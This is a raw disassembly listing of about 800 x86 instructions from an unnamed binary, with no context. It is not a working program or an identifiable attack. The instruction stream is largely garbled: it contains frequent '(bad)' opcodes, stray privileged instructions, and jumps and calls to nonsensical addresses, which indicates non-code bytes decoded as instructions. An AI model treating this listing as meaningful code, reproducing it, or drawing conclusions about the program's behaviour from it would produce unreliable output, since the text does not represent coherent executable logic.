  432b9d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432ba3:	cmp    BYTE PTR [ebx],al
  432ba5:	jne    0x432b30
  432ba7:	xor    esp,eax
  432ba9:	jmp    0x462d2c
  432bae:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bb1:	jne    0x432ba7
  432bb3:	call   0xffcd290d
  432bb8:	clc    
  432bb9:	xchg   edi,eax
  432bba:	sti    
  432bbb:	add    DWORD PTR [ebx],eax
  432bbd:	add    BYTE PTR [ebp+0x47],bl
  432bc0:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432bc6:	pop    ebp
  432bc7:	mov    DWORD PTR [esi-0x48],esi
  432bca:	jmp    0x432c13
  432bcc:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432bd2:	(bad)  
  432bd4:	cmp    al,0x0
  432bd6:	cmp    eax,DWORD PTR [ebp+0x18]
  432bd9:	lea    ebx,[ebp-0x56]
  432bdc:	jle    0x432bde
  432bde:	jae    0x432b69
  432be0:	mov    eax,esp
  432be2:	call   0xb900:0x8b005587
  432be9:	inc    ebp
  432bea:	push   ebp
  432beb:	lea    ecx,[ebp-0x27ff4f12]
  432bf1:	mov    eax,edi
  432bf3:	int3   
  432bf4:	push   ebp
  432bf5:	xchg   edi,eax
  432bf7:	add    esp,ebp
  432bf9:	add    BYTE PTR [eax],al
  432bfb:	inc    ebp
  432bfc:	add    BYTE PTR [ebp+0x8b3255],cl
  432c02:	cld    
  432c03:	mov    DWORD PTR [edx],edi
  432c05:	aam    0x75
  432c07:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c0d:	mov    DWORD PTR [ebx-0x50],edx
  432c10:	test   BYTE PTR [ebp-0x1],0xe8
  432c14:	mov    eax,DWORD PTR [eax]
  432c16:	hlt    
  432c17:	add    al,al
  432c19:	mov    eax,DWORD PTR ds:0x890045a8
  432c1f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c25:	inc    DWORD PTR [eax*2+0xf75854d]
  432c2c:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c32:	call   0x72998973
  432c37:	je     0x432c97
  432c39:	js     0x432c9a
  432c3b:	lock ret 0x7e
  432c3f:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c45:	mov    edi,edi
  432c47:	sbb    al,bl
  432c49:	clc    
  432c4a:	add    BYTE PTR [ebp-0x73],bh
  432c4d:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c53:	ror    BYTE PTR [eax],1
  432c55:	dec    ebp
  432c56:	xchg   ebp,eax
  432c57:	mov    edi,edi
  432c59:	in     al,0x8b
  432c5b:	jge    0x432be6
  432c5d:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432c63:	clc    
  432c64:	pop    esi
  432c65:	fist   DWORD PTR [ebp+0x5d398b5d]
  432c6b:	clc    
  432c6c:	add    al,0x6e
  432c6e:	mov    eax,DWORD PTR [ebx]
  432c70:	mov    BYTE PTR [ebp+0x0],dl
  432c73:	mov    edx,DWORD PTR [ebx-0x20]
  432c76:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432c7c:	add    eax,0x3b3b73
  432c81:	adc    al,0x89
  432c83:	pop    eax
  432c84:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432c88:	ret    0xf08
  432c8b:	cmp    al,0x2
  432c8d:	mov    edx,eax
  432c8f:	cld    
  432c90:	add    BYTE PTR [ebp+0x66],dl
  432c93:	add    eax,ebx
  432c95:	add    esp,eax
  432c97:	sub    eax,eax
  432c99:	or     BYTE PTR [ecx-0x77f474bb],cl
  432c9f:	add    BYTE PTR [eax],al
  432ca1:	mov    DWORD PTR [ebx-0x24],ebx
  432ca4:	push   edi
  432ca5:	push   ebp
  432ca6:	clc    
  432ca7:	add    DWORD PTR [esi+0x1b0100],0x45
  432cae:	out    0xff,eax
  432cb0:	add    edx,DWORD PTR [eax]
  432cb2:	jmp    0x432c9c
  432cb4:	cmp    ch,0x46
  432cb7:	(bad)  
  432cb8:	jmp    0x40c8b50a
  432cbd:	je     0x432c49
  432cbf:	mov    eax,DWORD PTR [eax-0x10c78104]
  432cc5:	inc    ebp
  432cc6:	add    BYTE PTR [ebx-0x770375],al
  432ccc:	add    ah,ch
  432cce:	add    edx,esp
  432cd0:	pop    edi
  432cd1:	pop    ebp
  432cd2:	push   ebp
  432cd3:	inc    ebx
  432cd4:	in     al,dx
  432cd5:	pop    ebp
  432cd6:	in     al,dx
  432cd7:	cmp    edx,DWORD PTR [edi-0x8]
  432cda:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432ce1:	add    al,0x47
  432ce3:	push   ebp
  432ce4:	mov    esp,ebp
  432ce6:	in     al,0x45
  432ce8:	dec    ebp
  432ce9:	push   esi
  432cea:	test   DWORD PTR [eax+0xfb010f],esi
  432cf0:	add    BYTE PTR [eax+0xc018b],dh
  432cf6:	leave  
  432cf7:	inc    ebp
  432cf8:	test   al,ch
  432cfa:	add    dh,bh
  432cfc:	add    bh,bh
  432cfe:	dec    ebp
  432cff:	push   cs
  432d00:	mov    DWORD PTR [ecx],eax
  432d02:	hlt    
  432d03:	push   es
  432d04:	dec    ebp
  432d05:	leave  
  432d06:	mov    DWORD PTR [eax],ecx
  432d08:	clc    
  432d09:	cmovge eax,ecx
  432d0c:	mov    ecx,0x85c2f0
  432d12:	clc    
  432d13:	pop    DWORD PTR [ebp+0x1]
  432d16:	push   ebx
  432d17:	add    BYTE PTR [ebp-0x15],bh
  432d1a:	push   esi
  432d1b:	xor    eax,0x898a45
  432d20:	cld    
  432d21:	add    al,BYTE PTR [ebp+0x0]
  432d24:	xor    esp,DWORD PTR [esi-0x64]
  432d27:	add    DWORD PTR [esi+0x78308c1],edi
  432d2d:	add    ah,BYTE PTR [ebp-0x49]
  432d30:	int    0xbb
  432d32:	mov    ecx,DWORD PTR [esi+0xc]
  432d35:	add    dh,al
  432d37:	cmp    ecx,ebx
  432d39:	jne    0x432d03
  432d3b:	xor    ecx,DWORD PTR [ebp+0x66]
  432d3e:	jmp    0xca2d44
  432d43:	add    DWORD PTR [ebp+0x0],eax
  432d46:	mov    eax,ebx
  432d48:	or     al,0x8b
  432d4a:	(bad)  
  432d4b:	mov    ecx,esi
  432d4d:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432d54:	mov    eax,edi
  432d56:	or     BYTE PTR [edx],cl
  432d58:	shl    cl,cl
  432d5a:	icebp  
  432d5b:	add    BYTE PTR [ebp+0x38],0x8b
  432d5f:	or     BYTE PTR [edx+eax*2],cl
  432d62:	(bad)  
  432d63:	or     cl,dh
  432d65:	stc    
  432d66:	shl    DWORD PTR [ebp-0x30],0xc6
  432d6a:	xor    al,0x0
  432d6c:	inc    ebp
  432d6d:	xchg   BYTE PTR [ebx],al
  432d6f:	add    esp,edi
  432d71:	add    BYTE PTR [ebp-0x39],cl
  432d74:	mov    al,bl
  432d76:	test   DWORD PTR [ebx+0x1c348375],ecx
  432d7c:	sub    al,0xbf
  432d7e:	jmp    0x432d05
  432d80:	mov    edi,eax
  432d82:	lock jge 0x432d76
  432d85:	lea    esi,[edx-0x74bad5ff]
  432d8b:	mov    ebp,esp
  432d8d:	or     cl,dh
  432d8f:	leave  
  432d90:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432d97:	dec    ebp
  432d98:	dec    ebp
  432d99:	test   DWORD PTR [ebx],eax
  432d9b:	paddb  mm6,mm0
  432d9e:	add    DWORD PTR [eax],eax
  432da0:	dec    ebp
  432da1:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432da7:	mov    esi,DWORD PTR [edx]
  432da9:	or     al,0x2b
  432dab:	dec    ebp
  432dac:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432db2:	mov    esp,edi
  432db4:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dbb:	mov    DWORD PTR [ebx],ebp
  432dbd:	call   0xc76b6ed
  432dc2:	mov    DWORD PTR [ebp+0x10],ecx
  432dc5:	(bad)  
  432dc6:	push   0x8b85ff10
  432dcb:	clc    
  432dcc:	or     al,0x54
  432dce:	(bad)  
  432dcf:	push   ecx
  432dd0:	retf   
  432dd1:	mov    ebx,0xff4d8dc8
  432dd6:	mov    DWORD PTR [ebp+0x8],eax
  432dd9:	xor    eax,DWORD PTR [ebp-0x75]
  432ddc:	cmp    ebp,DWORD PTR [ebx]
  432dde:	lsl    ebx,WORD PTR [edi-0x8]
  432de2:	call   DWORD PTR [ebx-0x741bff75]
  432de8:	(bad)  
  432de9:	or     al,0x5b
  432deb:	dec    ebp
  432dec:	or     BYTE PTR [ebx],dh
  432dee:	inc    ebp
  432def:	xor    esi,DWORD PTR ds:0x708088d
  432df5:	in     eax,0x9b
  432df7:	add    BYTE PTR [edx],dh
  432df9:	inc    ebp
  432dfa:	pop    edi
  432dfb:	xor    eax,edx
  432dfd:	test   DWORD PTR [eax],0x81108b8b
  432e03:	dec    ebp
  432e04:	sub    al,0x33
  432e06:	add    BYTE PTR [ebx],dh
  432e08:	push   esi
  432e09:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e0f:	mov    edi,eax
  432e11:	or     BYTE PTR [ebp+0x45],al
  432e14:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e1a:	xor    ecx,ecx
  432e1c:	pushf  
  432e1d:	push   es
  432e1e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432e25:	dec    ebp
  432e26:	inc    ebp
  432e27:	cmp    BYTE PTR [ecx],0x54
  432e2a:	pushf  
  432e2b:	gs (bad) 
  432e2d:	shl    esp,1
  432e2f:	dec    ebp
  432e30:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432e36:	shr    ecx,1
  432e38:	xlat   BYTE PTR ds:[ebx]
  432e39:	rol    bh,cl
  432e3b:	mov    edx,esp
  432e3d:	or     BYTE PTR [ebp+0x4588f84d],al
  432e43:	mov    ecx,DWORD PTR [eax]
  432e45:	or     BYTE PTR [eax],al
  432e47:	push   ebp
  432e48:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e4e:	dec    ebp
  432e4f:	enter  0xceba,0x8
  432e53:	retf   0x1807
  432e56:	ret    0x9b4d
  432e59:	mov    esi,DWORD PTR [edx]
  432e5b:	or     al,0x33
  432e5d:	into   
  432e5e:	add    edx,esi
  432e60:	add    ecx,edx
  432e62:	bswap  eax
  432e64:	ror    esi,0x98
  432e67:	dec    ebp
  432e68:	add    cl,ch
  432e6a:	mov    edi,edi
  432e6c:	hlt    
  432e6d:	inc    esi
  432e6f:	inc    ebp
  432e70:	ret    0x4533
  432e73:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432e79:	or     BYTE PTR [ebx],dh
  432e7b:	dec    ebp
  432e7c:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432e82:	jne    0xff8d2e49
  432e88:	inc    ebp
  432e89:	inc    ebp
  432e8a:	mov    esi,DWORD PTR [ebx]
  432e8c:	clc    
  432e8d:	pop    esi
  432e8e:	ret    0xcaeb
  432e91:	mov    eax,esi
  432e93:	call   0x52048366
  432e98:	dec    ebp
  432e99:	add    eax,0xf8728b
  432e9e:	adc    eax,0xce0ccac9
  432ea3:	push   ebp
  432ea4:	ret    0xc6ec
  432ea7:	in     al,dx
  432ea8:	call   0x33437bb1
  432ead:	push   edi
  432eae:	add    edi,eax
  432eb0:	xor    eax,eax
  432eb2:	jmp    0x432ef9
  432eb4:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432eba:	add    eax,edi
  432ebc:	shr    eax,cl
  432ebe:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432ec4:	mov    esi,DWORD PTR [edx]
  432ec6:	in     al,dx
  432ec7:	pushf  
  432ec8:	ret    0x84c7
  432ecb:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432ed1:	inc    ebp
  432ed2:	in     al,dx
  432ed3:	xor    DWORD PTR [ebp-0x64],eax
  432ed6:	mov    eax,edi
  432ed8:	cld    
  432ed9:	fmul   st(2),st
  432edb:	sbb    dl,al
  432edd:	jmp    0x9c3b:0x304d45c1
  432ee4:	jbe    0x432ead
  432ee6:	mov    esp,eax
  432ee8:	clc    
  432ee9:	add    BYTE PTR [ebp+0x0],cl
  432eec:	mov    ecx,ecx
  432eee:	lea    eax,[ebp-0x5]
  432ef1:	mov    edi,edi
  432ef3:	call   0x51ce833d
  432ef8:	hlt    
  432ef9:	xor    eax,edx
  432efb:	mov    esi,0x9b7284
  432f00:	xor    cl,dl
  432f02:	mov    esi,eax
  432f04:	hlt    
  432f05:	into   
  432f06:	inc    ebp
  432f07:	scas   eax,DWORD PTR es:[edi]
  432f08:	mov    ebp,ecx
  432f0a:	cld    
  432f0b:	add    dl,cl
  432f0d:	add    dl,al
  432f0f:	inc    ebp
  432f10:	shr    DWORD PTR [ebx],0x4d
  432f13:	xor    edi,DWORD PTR [ebx]
  432f15:	mov    DWORD PTR [edi],ecx
  432f17:	clc    
  432f18:	dec    esi
  432f19:	inc    ebp
  432f1a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f20:	ret    0xc6ca
  432f23:	mov    BYTE PTR [ebp-0x32],0x53
  432f27:	scas   eax,DWORD PTR es:[edi]
  432f28:	inc    ebp
  432f29:	jmp    0x432f5b
  432f2b:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f32:	pop    ebx
  432f33:	xor    ecx,DWORD PTR [ebp+0x3]
  432f36:	mov    eax,DWORD PTR [ebx]
  432f38:	clc    
  432f39:	test   edx,ecx
  432f3b:	mov    ecx,esi
  432f3d:	cld    
  432f3e:	call   0x8ab77488
  432f43:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f49:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f4f:	fdiv   QWORD PTR [ebx]
  432f51:	retf   0xce89
  432f54:	in     al,0xc1
  432f56:	inc    ebp
  432f57:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432f5d:	into   
  432f5e:	mov    dh,0xc1
  432f61:	call   0x8c1774ea
  432f66:	(bad)  
  432f67:	cld    
  432f68:	mov    ecx,DWORD PTR [ebp-0x14]
  432f6b:	xor    eax,ecx
  432f6d:	lea    eax,[ebp+0x8]
  432f70:	mov    esi,DWORD PTR [edx-0x4]
  432f73:	add    dl,al
  432f75:	inc    ebp
  432f76:	mov    esp,0x32d89b8b
  432f7b:	dec    ebp
  432f7c:	mov    esi,DWORD PTR [ebx]
  432f7e:	cld    
  432f7f:	xor    eax,edx
  432f81:	sub    esp,DWORD PTR [ebp-0x75]
  432f84:	int    0xec
  432f86:	sub    ecx,eax
  432f88:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432f8e:	mov    esi,esp
  432f90:	call   0x34177d19
  432f95:	inc    DWORD PTR [ebx]
  432f97:	mov    edi,DWORD PTR [ebx]
  432f99:	cld    
  432f9a:	jne    0x432fe9
  432f9c:	mov    esi,DWORD PTR [ebx]
  432f9e:	aam    0x8d
  432fa0:	dec    ebp
  432fa1:	or     BYTE PTR [ebx],dh
  432fa3:	jb     0x432fa8
  432fa5:	add    BYTE PTR [edi+0x45],bl
  432fa8:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432faf:	xor    ebp,esp
  432fb1:	xor    eax,edi
  432fb3:	sub    edi,esp
  432fb5:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  432fbb:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  432fc2:	inc    ebp
  432fc3:	xor    ecx,DWORD PTR [ecx+0x45891403]
  432fc9:	clc    
  432fca:	mov    eax,edi
  432fcc:	nop
  432fcd:	fadd   QWORD PTR [eax]
  432fcf:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  432fd5:	jmp    0x432f60
  432fd7:	mov    eax,DWORD PTR [ecx]
  432fd9:	fadd   DWORD PTR [eax]
  432fdb:	inc    ebp
  432fdc:	or     DWORD PTR [ebx],esi
  432fde:	dec    eax
  432fdf:	add    edx,DWORD PTR [ebx-0x2d]
  432fe2:	dec    ebp
  432fe3:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  432fe9:	inc    ebp
  432fea:	push   esp
  432feb:	mov    dl,BYTE PTR [ecx-0xd]
  432fee:	xor    ecx,DWORD PTR [ebp-0x45]
  432ff1:	(bad)  
  432ff3:	rol    BYTE PTR [eax],0xc1
  432ff6:	ret    
  432ff7:	inc    ebp
  432ff8:	inc    ebp
  432ff9:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  432fff:	xor    eax,ebx
  433001:	add    eax,DWORD PTR [ebp+0x23]
  433004:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43300a:	cmp    edi,0xc
  43300d:	dec    ebp
  43300e:	inc    ebp
  43300f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433015:	inc    ebp
  433016:	mov    esi,DWORD PTR [ebx]
  433018:	clc    
  433019:	lea    eax,[ebp+0x45725407]
  43301f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433023:	xor    edi,DWORD PTR [eax]
  433025:	mov    ecx,0xff8b8d4d
  43302a:	push   esp
  43302b:	enter  0x4df7,0x23
  43302f:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433035:	mov    eax,DWORD PTR [ebx]
  433037:	loopne 0x433024
  433039:	ret    0xc68b
  43303c:	push   esp
  43303d:	enter  0x9745,0x8b
  433041:	inc    ebp
  433042:	cld    
  433043:	mov    eax,edi
  433045:	clc    
  433046:	ret    
  433047:	ret    0xc645
  43304a:	mov    esi,DWORD PTR [ebx]
  43304c:	cld    
  43304d:	pop    esi
  43304e:	mov    ebx,0x83458bc3
  433054:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  433058:	dec    ebp
  433059:	xor    DWORD PTR [ebx],esi
  43305b:	pushf  
  43305c:	add    edi,DWORD PTR [edx-0x7767a77]
  433062:	fcom   DWORD PTR [ebp+0x45]
  433065:	mov    esi,DWORD PTR [ebx]
  433067:	adc    al,0x9c
  433069:	inc    ebp
  43306a:	(bad)  
  43306b:	mov    ebx,eax
  43306d:	adc    al,0x85
  43306f:	cmp    al,0x1
  433072:	inc    ebp
  433073:	add    BYTE PTR ds:0xe98b9c4d,bh
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	nop
  43307c:	add    BYTE PTR [eax],al
  43307e:	inc    ebp
  43307f:	mov    esi,DWORD PTR [ebx]
  433081:	add    eax,DWORD PTR [ebx]
  433083:	cmp    al,0x89
  433085:	mov    esp,esi
  433087:	clc    
  433088:	inc    ebp
  433089:	inc    ebp
  43308a:	add    edx,DWORD PTR [esi+0xc]
  43308d:	mov    edi,0x7ff0845
  433092:	in     al,dx
  433093:	(bad)  
  433094:	jne    0x433031
  433096:	mov    esi,DWORD PTR [edx]
  433098:	clc    
  433099:	add    ebp,DWORD PTR [esi]
  43309b:	mov    edi,edi
  43309d:	in     al,dx
  43309e:	mov    DWORD PTR [ebp-0x10],eax
  4330a1:	xor    eax,DWORD PTR [ebp+0x3]
  4330a4:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  4330aa:	fmul   DWORD PTR [ebx-0x173caf39]
  4330b0:	lea    ecx,[ecx+0x45e8d4bc]
  4330b6:	clc    
  4330b7:	mov    edi,edi
  4330b9:	cmp    BYTE PTR [ebp+0x4d],al
  4330bc:	test   DWORD PTR [eax+0x74],ecx
  4330bf:	inc    ecx
  4330c0:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  4330c6:	ret    
  4330c7:	inc    eax
  4330c8:	dec    DWORD PTR [ebx+0x4945f8f0]
  4330ce:	push   eax
  4330cf:	dec    eax
  4330d0:	test   al,0xd0
  4330d2:	dec    eax
  4330d4:	mov    eax,DWORD PTR [ebp-0x14]
  4330d7:	mov    eax,DWORD PTR [ebp+0x38]
  4330da:	mov    eax,ecx
  4330dc:	fadd   DWORD PTR [ebx]
  4330de:	dec    ebp
  4330df:	inc    eax
  4330e0:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  4330e6:	inc    ebp
  4330e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4330ed:	fadd   QWORD PTR [ebx]
  4330ef:	inc    ebp
  4330f0:	or     al,0x33
  4330f2:	dec    ebp
  4330f3:	add    edi,DWORD PTR [ebx]
  4330f5:	mov    DWORD PTR [edx-0x28],esi
  4330f8:	mov    eax,DWORD PTR [ebp-0x10]
  4330fb:	mov    eax,DWORD PTR [eax+0x10]
  4330fe:	mov    eax,edi
  433100:	lock ret 
  433102:	inc    ecx
  433103:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433109:	fsubr  st,st(5)
  43310b:	test   DWORD PTR [eax],eax
  43310d:	clc    
  43310e:	push   0x45
  433110:	(bad)  
  433111:	cmp    al,0xec
  433113:	pushf  
  433114:	inc    ebp
  433115:	(bad)  
  433116:	push   eax
  433117:	fsub   DWORD PTR [eax-0x7b]
  43311a:	(bad)  
  43311b:	clc    
  43311c:	mov    eax,0xf8008584
  433121:	mov    eax,DWORD PTR [ebp-0x4]
  433124:	mov    edi,0x4585c3cc
  43312a:	clc    
  43312b:	mov    eax,DWORD PTR [ebp+0x14]
  43312e:	xor    eax,DWORD PTR [ebp-0x64]
  433131:	mov    edi,eax
  433133:	in     al,dx
  433134:	les    esi,FWORD PTR [ebp-0x7b]
  433137:	mov    edi,eax
  433139:	or     al,0x4d
  43313b:	dec    ebp
  43313c:	mov    eax,ebp
  43313e:	in     al,0xf2
  433140:	dec    ebp
  433141:	dec    DWORD PTR [ecx+0x4dc7e045]
  433147:	fmul   DWORD PTR [ecx+0x4df8f085]
  43314d:	inc    ebp
  43314e:	mov    DWORD PTR [ebx],esi
  433150:	fadd   QWORD PTR [ebx]
  433152:	dec    ebp
  433153:	push   eax
  433154:	xor    eax,DWORD PTR [ebp+0x3]
  433157:	push   eax
  433158:	mov    DWORD PTR [eax+ebx*8],ebx
  43315b:	push   esi
  43315d:	mov    eax,DWORD PTR [eax]
  43315f:	lock cmp eax,0xf84e85c0
  433165:	inc    ebp
  433166:	test   BYTE PTR [ebx],dh
  433168:	add    DWORD PTR [ebx],eax
  43316a:	add    BYTE PTR [eax+0x4d],dl
  43316d:	jne    0x4331a2
  43316f:	lea    ecx,[ebx-0x7617fc44]
  433175:	div    ah
  433177:	inc    DWORD PTR [ebp+0x45]
  43317a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433180:	jb     0x43310d
  433182:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433189:	mov    ecx,DWORD PTR [ebp-0x10]
  43318c:	xor    ecx,DWORD PTR [ebp+0x3]
  43318f:	mov    edi,DWORD PTR [ebx]
  433191:	adc    BYTE PTR [ebp+0x41],dh
  433194:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43319a:	ret    
  43319b:	push   ss
  43319c:	push   0x45
  43319e:	lea    ecx,[ebx+0x4de80cb0]
  4331a4:	sti    
  4331a5:	add    edi,edi
  4331a7:	or     BYTE PTR [ebp+0x4d],al
  4331aa:	mov    ebp,DWORD PTR [ebx]
  4331ac:	xor    ebp,ecx
  4331ae:	mov    al,BYTE PTR [edx]
  4331b0:	add    eax,0xc7200
  4331b5:	jne    0x433204
  4331b7:	lea    esi,[ebx]
  4331b9:	mov    al,0xf
  4331bb:	call   0xf2880
  4331c0:	shl    DWORD PTR [ecx],0x84
  4331c3:	pushf  
  4331c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331ca:	mov    esi,DWORD PTR [edx]
  4331cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331d3:	test   DWORD PTR [eax],eax
  4331d5:	clc    
  4331d6:	dec    ebp
  4331d7:	inc    ebp
  4331d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4331db:	pushf  
  4331dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331e3:	lea    eax,[ecx]
  4331e5:	int3   
  4331e6:	add    BYTE PTR [ebp+0x45],cl
  4331e9:	lea    ecx,[ebx-0x75b2cc38]
  4331ef:	lea    eax,ds:0x4d72c4
  4331f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4331f8:	xor    ecx,edi
  4331fa:	bswap  ebx
  4331fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433200:	rol    DWORD PTR [ecx],0x84
  433203:	add    BYTE PTR [ecx],al
  433205:	xor    eax,DWORD PTR [eax]
  433207:	pushf  
  433208:	inc    ebp
  433209:	jnp    0x8a43660c
  43320f:	mov    eax,DWORD PTR ds:0xcf72e8
  433215:	lock dec ebp
  433217:	retf   
  433218:	xor    ecx,DWORD PTR [ebp+0xf]
  43321b:	mov    eax,eax
  43321d:	fmul   st,st(3)
  43321f:	test   ecx,0x19b8484
  433225:	xor    al,BYTE PTR [eax]
  433227:	mov    DWORD PTR [ebp-0x28],eax
  43322a:	mov    eax,DWORD PTR [ebp+0x33]
  43322d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433233:	ret    
  433234:	add    al,cl
  433236:	dec    ebp
  433237:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43323d:	add    ecx,DWORD PTR ds:0xc7250
  433243:	inc    ebp
  433244:	rcl    DWORD PTR [eax+0x4d],0x2b
  433248:	mov    edi,edi
  43324a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433250:	jb     0x433219
  433252:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433259:	mov    esi,DWORD PTR [ebx]
  43325b:	cld    
  43325c:	mov    cl,bh
  43325e:	or     eax,0x372b6
  433263:	cmp    ecx,eax
  433265:	jne    0x4332e2
  43326b:	mov    eax,DWORD PTR [ebp-0x20]
  43326e:	mov    eax,DWORD PTR [eax]
  433270:	xor    eax,edi
  433272:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433279:	mov    ecx,DWORD PTR [ebp-0x4]
  43327c:	mov    ecx,edi
  43327e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433284:	jb     0x433295
  433286:	add    BYTE PTR [edi-0x3f],dl
  433289:	add    BYTE PTR [ebp-0x75],cl
  43328c:	mov    esi,eax
  43328e:	xor    eax,DWORD PTR [eax]
  433290:	mov    al,bh
  433292:	or     eax,0x4b7284
  433297:	xor    al,cl
  433299:	mov    ecx,DWORD PTR [ebp-0x4]
  43329c:	mov    ecx,edi
  43329e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332a4:	jb     0x4332b5
  4332a6:	add    BYTE PTR [edi],dh
  4332a8:	enter  0x8500,0x8b
  4332ac:	add    ah,bl
  4332ae:	add    BYTE PTR [eax],al
  4332b0:	inc    ebp
  4332b1:	(bad)  
  4332b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332b9:	mov    esi,DWORD PTR [edx-0x4]
  4332bc:	add    bh,cl
  4332be:	dec    ebp
  4332bf:	mov    dh,0x8b
  4332c1:	add    esi,DWORD PTR [ebx]
  4332c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332c9:	add    BYTE PTR [eax],al
  4332cb:	mov    eax,ecx
  4332cd:	loopne 0x43331c
  4332cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332d5:	dec    ebx
  4332d6:	or     eax,0x8b7232
  4332db:	in     al,0xc1
  4332dd:	or     DWORD PTR [ebp-0x31],ecx
  4332e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332e7:	xor    dh,BYTE PTR [edx-0x75]
  4332ea:	add    al,dh
  4332ec:	enter  0x4f09,0xcf
  4332f0:	inc    ebp
  4332f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4332f7:	or     al,BYTE PTR ds:0xe4728b
  4332fd:	or     DWORD PTR [ebp-0x31],ecx
  433300:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433307:	cmp    dh,BYTE PTR [edx+0xf]
  43330a:	add    bl,dl
  43330c:	rol    DWORD PTR [eax],0x4d
  43330f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433315:	(bad)  
  433316:	or     eax,0x4b7284
  43331b:	xor    al,cl
  43331d:	mov    ecx,DWORD PTR [ebp-0x20]
  433320:	mov    ecx,DWORD PTR [ecx]
  433322:	xor    ecx,edi
  433324:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43332b:	xor    cl,al
  43332d:	mov    ecx,DWORD PTR [edi]
  43332f:	fadd   QWORD PTR [ebp+0x9]
  433332:	call   0xffd02e06
  433337:	dec    ebx
  433338:	dec    ebp
  433339:	xor    bh,BYTE PTR [ebx]
  43333b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43333f:	loopne 0x43333d
  433341:	or     edi,eax
  433343:	iret   
  433344:	ret    
  433345:	mov    WORD PTR [ebp+0x4f],es
  433348:	mov    esi,DWORD PTR [edx]
  43334a:	call   0x8452fa89
  43334f:	(bad)  
  433350:	fwait
  433351:	add    BYTE PTR [edx],dh
  433353:	mov    esi,DWORD PTR [ebx]
  433355:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43335b:	test   BYTE PTR [ebx],dh
  43335d:	dec    ebx
  43335e:	add    esi,DWORD PTR [edx]
  433360:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433366:	dec    edi
  433368:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43336f:	xor    al,BYTE PTR [ebx]
  433371:	mov    edi,DWORD PTR [ebx]
  433373:	in     al,0x75
  433375:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43337b:	dec    ebx
  43337c:	xor    esi,DWORD PTR [edx]
  43337e:	lea    ecx,[edx]
  433380:	or     BYTE PTR [ebx+0x900f072],cl
  433386:	ja     0x433357
